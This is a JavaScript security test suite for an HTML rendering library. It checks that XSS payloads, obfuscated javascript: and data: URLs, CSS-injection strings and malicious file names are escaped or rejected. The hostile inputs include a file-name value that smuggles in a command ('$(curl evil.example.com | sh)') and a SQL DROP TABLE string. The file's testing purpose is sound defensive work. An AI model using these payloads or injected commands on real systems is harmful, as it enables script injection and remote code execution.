// Security contract: contextual escaping property test (5,000 seeded inputs through every string
// parameter of every function) and targeted context attacks.
import { lintHtml } from '@frame12/lint';
import { S, check, finish, prng, scanMarkup, throws } from './lib.mjs';

const SEED = 0xf12c0de;
const N = 5000;

const PIECES = [
  '<script>alert(1)</script>',
  '<img src=x onerror=alert(1)>',
  '"><svg onload=alert(1)>',
  "'><a href='javascript:alert(1)'>x</a>",
  '`${alert(1)}`',
  '&amp;',
  '&lt;b&gt;',
  '&#106;avascript:',
  '&#x3C;script&#x3E;',
  '</style><script>x</script>',
  '</section></div>',
  '<!--',
  '-->',
  ']]>',
  '<![CDATA[x]]>',
  '{{constructor}}',
  'url(javascript:alert(1))',
  'expression(alert(1))',
  '👩‍💻',
  '🧪🔥',
  'שלום עולם',
  'مرحبا',
  '‮gnp.exe',
  '‏‎',
  '\u0000',
  '\u0007',
  '\u001b[31m',
  '\u007f',
  '\u0085',
  '\uD800',
  '\uDFFF',
  '􏿿',
  '￾',
  '\t\n\r',
  'C-01',
  'plain text',
  "O'Reilly & Sons",
  'a"b',
  '>',
  '<',
  '=',
  '\\',
];

const rand = prng(SEED);
function genInput() {
  const n = 1 + Math.floor(rand() * 5);
  let s = '';
  for (let i = 0; i < n; i++) {
    if (rand() < 0.8) s += PIECES[Math.floor(rand() * PIECES.length)];
    else s += String.fromCharCode(Math.floor(rand() * 0x10000));
  }
  return s;
}

const trustedChild = S.unsafeRaw('<b class="probe">trusted</b>');
const tagChild = S.tag({ children: 'kept & once' });

/** Every string parameter of every function, as (name, render(value)) pairs. */
const SINKS = [
  ['sheet.children', (v) => S.sheet({ children: v })],
  ['scene.children', (v) => S.scene({ children: v })],
  ['sceneArea.children', (v) => S.sceneArea({ area: 'main', children: v })],
  ['panel.cut', (v) => S.panel({ cut: v, children: 'x' })],
  ['panel.label', (v) => S.panel({ label: v, children: 'x' })],
  ['panel.children', (v) => S.panel({ children: v })],
  ['panelPair.topCut', (v) => S.panelPair({ top: {}, bottom: {}, topCut: v })],
  ['panelPair.bottomCut', (v) => S.panelPair({ top: {}, bottom: {}, bottomCut: v })],
  ['panelPair.topLabel', (v) => S.panelPair({ top: {}, bottom: {}, topLabel: v })],
  ['panelPair.bottomLabel', (v) => S.panelPair({ top: {}, bottom: {}, bottomLabel: v })],
  ['panelPair.top.children', (v) => S.panelPair({ top: { children: v }, bottom: { label: v } })],
  ['panelPair.children', (v) => S.panelPair({ children: v })],
  ['balloon.children', (v) => S.balloon({ children: v })],
  ['tag.children', (v) => S.tag({ status: 'warning', children: v })],
  ['tag.glyph', (v) => S.tag({ glyph: v, children: 'x' })],
  ['tag.srLabel', (v) => S.tag({ srLabel: v, children: 'x' })],
  ['badge.children', (v) => S.badge({ children: v })],
  ['badge.glyph', (v) => S.badge({ status: 'info', glyph: v, children: 'x' })],
  ['badge.srLabel', (v) => S.badge({ status: 'info', srLabel: v, children: 'x' })],
  ['metric.label', (v) => S.metric({ label: v, value: 1 })],
  ['metric.note', (v) => S.metric({ label: 'l', value: 1, note: v })],
  ['metric.comparisonLabel', (v) => S.metric({ label: 'l', value: 1, delta: 0.1, comparisonLabel: v })],
  ['metric.range', (v) => S.metric({ label: 'l', value: 1, delta: 0.1, range: v })],
  ['metric.format()', (v) => S.metric({ label: 'l', value: 1, format: () => v, big: true })],
  ['toneBarList.title', (v) => S.toneBarList({ title: v, items: [] })],
  ['toneBarList.subtitle', (v) => S.toneBarList({ subtitle: v, items: [] })],
  ['toneBarList.items.name', (v) => S.toneBarList({ items: [{ id: 'a', name: v, value: 1 }] })],
  ['toneBarList.items.formattedValue', (v) => S.toneBarList({ items: [{ id: 'a', name: 'n', value: 1, formattedValue: v }] })],
  ['toneBarList.items.badge', (v) => S.toneBarList({ items: [{ id: 'a', name: 'n', value: 1, badge: v }] })],
  ['ghostWire.from', (v) => S.ghostWire({ from: v, to: 'b' })],
  ['ghostWire.to', (v) => S.ghostWire({ from: 'a', to: v })],
  ['ghostWire.label', (v) => S.ghostWire({ from: 'a', to: 'b', label: v })],
  ['receipt.value', (v) => S.receipt({ kind: 'file', value: v })],
  ['receipt.value(commit)', (v) => S.receipt({ kind: 'commit', value: v, href: 'https://example.com/c' })],
  ['receipt.href', (v) => S.receipt({ kind: 'link', value: 'v', href: v })],
  ['receipt.title', (v) => S.receipt({ kind: 'link', value: '', href: 'https://example.com', title: v })],
  ['receipt.date', (v) => S.receipt({ kind: 'file', value: 'f', date: v })],
  ['receiptList.ariaLabel', (v) => S.receiptList({ items: [{ kind: 'file', value: v }], ariaLabel: v })],
  ['fragment', (v) => S.fragment(v, trustedChild, v)],
  ['document.title', (v) => S.document({ title: v, body: S.fragment('x'), inlineCss: false })],
  ['document.lang', (v) => S.document({ title: 't', lang: v, body: S.fragment('x'), inlineCss: false })],
];

const FIXED_STRUCTURE = new Set([
  'sheet.children', 'scene.children', 'sceneArea.children', 'panel.label', 'panel.children', 'panelPair.topLabel',
  'panelPair.bottomLabel', 'panelPair.top.children', 'panelPair.children', 'balloon.children', 'badge.children',
  'metric.label', 'metric.format()', 'toneBarList.items.name', 'toneBarList.items.formattedValue', 'ghostWire.from',
  'ghostWire.to', 'receipt.value', 'fragment', 'document.title', 'document.lang',
]);
const ALLOWED_TAGS = new Set(['html', 'head', 'meta', 'title', 'body', 'div', 'span', 'section', 'svg', 'polygon', 'path', 'circle', 'line', 'defs', 'mask', 'p', 'h2', 'h3', 'h4', 'ul', 'li', 'a', 'code', 'b', 'style']);
const ALLOWED_ATTRS = new Set([
  'class', 'id', 'style', 'role', 'lang', 'href', 'title', 'charset', 'name', 'content', 'width', 'height', 'viewbox',
  'preserveaspectratio', 'points', 'vector-effect', 'd', 'cx', 'cy', 'r', 'x', 'y', 'x1', 'y1', 'x2', 'y2', 'maskunits',
  'mask', 'stroke-dasharray', 'stroke-dashoffset', 'focusable', 'aria-hidden', 'aria-label', 'aria-live', 'aria-current',
  'data-theme', 'data-autocut', 'data-gutter', 'data-layout', 'data-columns', 'data-breakpoint', 'data-scene-bp',
  'data-area', 'data-variant', 'data-status', 'data-density', 'data-static', 'data-pattern', 'data-orientation',
  'data-strength', 'data-fill', 'data-endpoint', 'data-kind', 'data-origin', 'data-f12-tokens', 'data-f12-static',
]);
const lt = (s) => (s.match(/</g) || []).length;
const quot = (s) => (s.match(/"/g) || []).length;
const BENIGN = 'X';
const baseline = new Map(SINKS.map(([name, render]) => [name, render(BENIGN)]));

let structuralFailures = [];
let lintFailures = [];
let threw = [];
let renders = 0;
const lintEvery = 7; // lint a deterministic 1-in-7 sample of renders, plus every render of the first 500 inputs
for (let i = 0; i < N; i++) {
  const input = genInput();
  for (const [name, render] of SINKS) {
    let out;
    try {
      out = render(input);
    } catch (err) {
      threw.push(`${name}: ${err.message}`);
      continue;
    }
    renders++;
    const base = baseline.get(name);
    // Markup structure can't depend on the input. For sinks where the input is only ever text
    // (children, labels), the tag and quote counts equal the benign render's exactly. Every
    // sink may only emit the kit's own tags and attributes.
    if (FIXED_STRUCTURE.has(name) && (lt(out) !== lt(base) || quot(out) !== quot(base))) {
      structuralFailures.push(`${name} ← ${JSON.stringify(input).slice(0, 80)}`);
    }
    const scanned = scanMarkup(out.replace(/<style data-f12[^>]*>[\s\S]*?<\/style>/g, ''));
    const badTag = [...scanned.tags].find((t) => !ALLOWED_TAGS.has(t));
    const badAttr = [...scanned.attributes].find((a) => !ALLOWED_ATTRS.has(a));
    if (badTag || badAttr) structuralFailures.push(`${name} emitted <${badTag ?? ''}> [${badAttr ?? ''}] ← ${JSON.stringify(input).slice(0, 80)}`);
    // No raw markup from the input survives anywhere.
    if (/<(script|img|svg onload|iframe|a href='javascript)|<!\[CDATA|<\/style><script/i.test(out)) {
      structuralFailures.push(`${name} raw markup ← ${JSON.stringify(input).slice(0, 80)}`);
    }
    if (/[\u0000-\u0008\u000B\u000C\u000E-\u001F\u007F-\u009F]/.test(out) || /[\uD800-\uDBFF](?![\uDC00-\uDFFF])|(?<![\uD800-\uDBFF])[\uDC00-\uDFFF]/.test(out)) {
      structuralFailures.push(`${name} control/surrogate ← ${JSON.stringify(input).slice(0, 80)}`);
    }
    if (i < 500 || (i * SINKS.length + renders) % lintEvery === 0) {
      const v = lintHtml(String(out)).filter((x) => x.rule === 'unsafe-html');
      if (v.length) lintFailures.push(`${name}: ${v[0].message}`);
    }
  }
}
// Validated params (lang falls back; others are free text) must never throw on text input.
check(threw.length === 0, `property: ${N} seeded inputs × ${SINKS.length} string parameters render without throwing (${renders} renders)`, threw.slice(0, 3).join(' | '));
check(structuralFailures.length === 0, 'property: no unescaped markup, control characters or lone surrogates from input reach the output', structuralFailures.slice(0, 5).join(' | '));
check(lintFailures.length === 0, 'property: lintHtml reports no unsafe-html on sampled outputs (all of the first 500 inputs, then 1 in 7)', lintFailures.slice(0, 3).join(' | '));

// Escaped exactly once; Html is never re-escaped.
{
  const once = S.panel({ children: 'a & <b>' });
  check(once.includes('a &amp; &lt;b&gt;') && !once.includes('&amp;amp;'), 'text is HTML-escaped exactly once');
  const nested = S.panel({ children: S.panel({ children: 'a & b' }) });
  check(nested.includes('a &amp; b') && !nested.includes('&amp;amp;') && !nested.includes('&lt;section'), 'nested Html is not re-escaped');
  const raw = S.panel({ children: trustedChild });
  check(raw.includes('<b class="probe">trusted</b>'), 'unsafeRaw() Html is inserted verbatim');
  check(S.fragment(tagChild, ' ', tagChild).split('kept &amp; once').length === 3, 'fragment() keeps Html parts and escapes once');
  const forged = S.panel({ children: '<b>forged</b>' });
  check(forged.includes('&lt;b&gt;forged&lt;/b&gt;'), 'a string cast to Html at the type level is still escaped at runtime');
  const plus = S.panel({ children: tagChild + tagChild });
  check(plus.includes('&lt;span'), 'Html joined with + is a plain string and is escaped (use fragment())');
  check(S.isHtml(S.fragment('<probe>')) && !S.isHtml('<never rendered by the kit>'), 'isHtml() recognises renderer output only');
  check(S.escapeHtml(`&<>"'`) === '&amp;&lt;&gt;&quot;&#39;', "escapeHtml escapes & < > \" '");
  check(S.escapeHtml('a\u0000b\uD800c') === 'a�b�c', 'escapeHtml replaces control characters and lone surrogates with U+FFFD');
  check(throws(() => S.unsafeRaw(42)), 'unsafeRaw() rejects non-strings');
  check(throws(() => S.panel({ children: 42 })), 'children of the wrong type throw');
  check(throws(() => S.document({ title: 't', body: '<p>x</p>' })), 'document() body must be Html, not a plain string');
}

// Context attacks: URLs.
{
  const bad = [
    'javascript:alert(1)',
    'JaVaScRiPt:alert(1)',
    'java\tscript:alert(1)',
    'java\nscript:alert(1)',
    ' javascript:alert(1)',
    '\u0001javascript:alert(1)',
    '&#106;avascript:alert(1)',
    '&#x6A;avascript:alert(1)',
    'javascript&colon;alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'DATA:text/html;base64,PHNjcmlwdD4=',
    'vbscript:msgbox(1)',
    'file:///etc/passwd',
    '//evil.example.com',
    '/\\evil.example.com',
    'https:\\\\evil.example.com',
    'https://exa mple.com',
    'https://example.com/‮gnp.exe',
    'http://',
    '',
    '#a b',
    '#"><script>',
  ];
  const leaked = bad.filter((u) => S.safeUrl(u) !== null);
  check(leaked.length === 0, `safeUrl rejects ${bad.length} hostile or obfuscated URLs (javascript:, JaVaScRiPt:, java\\tscript:, &#106;avascript:, data:, vbscript:, …)`, leaked.join(' | '));
  const good = ['https://github.com/o/r/pull/1', 'http://example.com/a?b=1&c=2', 'mailto:team@example.com', '#evidence', 'HTTPS://EXAMPLE.COM'];
  check(good.every((u) => S.safeUrl(u) === u), 'safeUrl keeps http:, https:, mailto: and #fragment URLs unchanged');
  const hrefLeaks = bad.filter((u) => S.receipt({ kind: 'link', value: 'shown as text', href: u }).includes('href='));
  check(hrefLeaks.length === 0, 'receipt(): a rejected href renders no href and no <a>', hrefLeaks.join(' | '));
  const r = S.receipt({ kind: 'link', value: 'shown as text', href: 'javascript:alert(1)' });
  check(r.includes('<span class="f12-receipt-value">shown as text</span>') && !r.includes('<a'), 'receipt(): a rejected href fails closed and the value is shown as text');
  const amp = S.receipt({ kind: 'link', value: 'q', href: 'https://example.com/?a=1&b="2"' });
  check(amp.includes('href="https://example.com/?a=1&amp;b=&quot;2&quot;"'), 'href values are attribute-escaped');
}

// Context attacks: CSS and identifiers.
{
  const cssPayloads = ['main;background:url(//x)', 'a}body{display:none', 'Main', '1main', 'main"', 'main>', '--x', 'a b', 'ma\u0000in', 'x'.repeat(65), ''];
  check(cssPayloads.every((a) => throws(() => S.sceneArea({ area: a, children: 'x' }))), 'sceneArea(): CSS injection through area throws a TypeError');
  check(cssPayloads.every((a) => throws(() => S.panel({ area: a, children: 'x' }))), 'panel(): CSS injection through area throws');
  check(cssPayloads.every((a) => throws(() => S.panelPair({ area: a }))), 'panelPair(): CSS injection through area throws');
  check(
    ['a}body{x', 'a "b"', 'main;color:red', 'a B', 'x\u0000'].every((row) => throws(() => S.scene({ areas: [row], children: 'x' }))) &&
      throws(() => S.scene({ areas: ['a b', 'c'], children: 'x' })),
    'scene(): CSS injection through areas rows (and ragged rows) throws',
  );
  const bps = ['860px) { body { display:none } } @media (x', '1e3px', '960', '9.5px', '960PX', '960vw', 'calc(1px)', '-960px', '12345px', 0, -1, 1.5, 10000, NaN, Infinity, '960px;'];
  check(bps.every((b) => throws(() => S.scene({ areas: ['a'], breakpoint: b, children: 'x' }))), 'scene(): CSS injection through breakpoint throws (strings must match ^\\d{2,4}(px|rem|em)$)');
  check(S.scene({ areas: ['a'], breakpoint: 960, children: 'x' }).includes('@media (min-width: 960px)') && S.scene({ areas: ['a'], breakpoint: '60rem', children: 'x' }).includes('@media (min-width: 60rem)'), 'scene(): valid breakpoints are re-serialized into the scoped <style>');
  const prefixes = ['x" onmouseover="alert(1)', 'a b', 'A', '1a', 'a_b', 'a>b', 'a'.repeat(65), ''];
  check(prefixes.every((p) => throws(() => S.toneBarList({ items: [], idPrefix: p }))), 'toneBarList(): idPrefix injection throws');
  check(throws(() => S.toneBarList({ items: [{ id: 'x" onclick="y', name: 'n', value: 1 }] })), 'toneBarList(): item id injection throws');
  check(throws(() => S.toneBarList({ items: [], selectedId: '"><script>' })), 'toneBarList(): selectedId injection throws');
  const attrs = S.panel({ label: 'a" onclick="x()" data-x=">', children: 'x' });
  check(attrs.includes('aria-label="a&quot; onclick=&quot;x()&quot; data-x=&quot;&gt;"') && !attrs.includes(' onclick="'), '" and > in attribute values are escaped (no attribute breakout)');
  const gw = S.ghostWire({ from: '"><img src=x>', to: "'b'", label: undefined });
  check(!gw.includes('<img') && gw.includes('aria-label="&quot;&gt;&lt;img src=x&gt; usually changes with &#39;b&#39;'), 'ghostWire(): endpoint text is escaped in content and in the derived aria-label');
}

// Malicious file names in receipt().
{
  const names = [
    '"><script>alert(1)</script>.ts',
    "src/'; DROP TABLE commits; --.sql",
    '../../../../etc/passwd',
    'src/‮gnp.exe',
    'docs/<img src=x onerror=alert(1)>.md',
    '$(curl evil.example.com | sh).js',
    'a'.repeat(2000) + '.ts',
    'src/\u0000null.ts',
    '`whoami`.txt',
  ];
  const outs = names.map((n) => S.receipt({ kind: 'file', value: n, title: n, date: n, origin: 'bot' }));
  check(
    outs.every((o) => !/<script|<img/.test(o) && (o.match(/</g) || []).length === (outs[2].match(/</g) || []).length),
    'receipt(): malicious file names render as escaped text with identical markup structure',
  );
  check(outs[0].includes('&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;.ts'), 'receipt(): file name characters are preserved, escaped once');
  const listed = S.receiptList({ items: names.map((n) => ({ kind: 'file', value: n })) });
  check(lintHtml(String(listed)).filter((v) => v.rule === 'unsafe-html').length === 0, 'receiptList() of malicious names passes lintHtml unsafe-html');
}

finish('escaping');
